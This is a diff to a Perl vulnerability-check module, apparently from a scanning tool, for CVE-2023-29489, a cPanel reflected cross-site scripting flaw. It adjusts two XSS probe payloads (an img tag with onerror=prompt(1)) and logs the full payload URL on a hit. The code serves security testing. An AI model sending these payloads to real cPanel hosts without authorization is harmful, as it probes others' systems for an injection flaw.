@@ -27,8 +27,8 @@ package Spellbook::Advisory::CVE_2023_29489 {
             );
 
             my @payloads = (
-                "/cpanelwebcall/<img%20src=x%20onerror=\"prompt(1)\">aaaaaaaaaaaa",
-                "/<img%20src=x%20onerror=\"prompt(1)\">aaaaaaaaaaaa"
+                "cpanelwebcall/<img%20src=x%20onerror=\"prompt(1)\">aaaaaaaaaaaa",
+                "<img%20src=x%20onerror=\"prompt(1)\">aaaaaaaaaaaa"
             );
 
             foreach my $payload (@payloads) {
@@ -36,7 +36,7 @@ package Spellbook::Advisory::CVE_2023_29489 {
 
                 if ($request -> code() == 400 ) {
                     if ($request -> content() =~ /cPanel/) {
-                        push @result, $target;
+                        push @result, "$target/$payload";
                     }
                 }
             }
